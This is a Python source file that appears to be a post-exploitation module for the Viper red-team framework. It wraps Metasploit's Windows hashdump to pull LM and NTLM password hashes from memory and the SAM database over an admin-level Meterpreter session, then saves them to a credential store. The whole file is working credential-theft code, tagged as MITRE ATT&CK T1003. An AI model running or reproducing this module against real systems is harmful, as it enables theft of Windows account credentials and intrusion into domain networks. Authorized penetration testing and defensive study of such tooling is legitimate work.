# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :


from Lib.ModuleAPI import *


class PostModule(PostMSFRawModule):
    NAME_ZH = "获取Windows内存Hash"
    DESC_ZH = "此模块使用Hashdump抓取内存及SAM数据库中的Hash.\n" \
              "针对DC的Haskdump的耗时与域用户数量成正比."

    NAME_EN = "Get Windows hash"
    DESC_EN = "This module uses Hashdump to grab Hash in memory and SAM database.\n" \
              "The time consumption of Haskdump for DC is proportional to the number of domain users."

    REQUIRE_SESSION = True
    MODULETYPE = TAG2TYPE.Credential_Access
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["Administrator", "SYSTEM", ]  # 所需权限
    ATTCK = ["T1003"]  # ATTCK向量
    REFERENCES = ["https://attack.mitre.org/techniques/T1003/"]
    README = ["https://www.yuque.com/vipersec/module/wkqgqd"]
    AUTHOR = ["Viper"]

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)
        self.type = "post"
        self.mname = "windows/gather/hashdump_api"

    def check(self):
        """执行前的检查函数"""
        self.session = Session(self._sessionid)
        if self.session.is_windows is not True:
            return False, "此模块只支持Windows的Meterpreter", "This module only supports Meterpreter for Windows"
        if self.session.is_admin is not True:
            return False, "此模块需要管理员权限,请尝试提权", "This module requires administrator privileges, please try privilege escalation"
        return True, None

    def callback(self, status, message, data):
        if status:
            self.log_info("Hash列表:", "Hash list")
            domain = self.session.domain
            for record in data:
                self.log_raw(record.get("hash_string"))
                try:
                    type = "Hash"
                    user = record.get("user_name")
                    if user.endswith("$") or user == "Guest":
                        continue
                    password = f"{record.get('lanman')}:{record.get('ntlm')}"
                    tag = {'domain': domain, 'type': type}
                    self.add_credential(username=user, password=password, password_type='windows', tag=tag)
                except Exception as E:
                    self.log_except(str(E), str(E))
                    continue
        else:
            self.log_error("模块执行失败", "Module execution failed")
            self.log_error(message, message)
        self.log_info("Hash已存储,可以到<凭证管理>查看", "Hash has been stored, you can go to <Credential> to view")
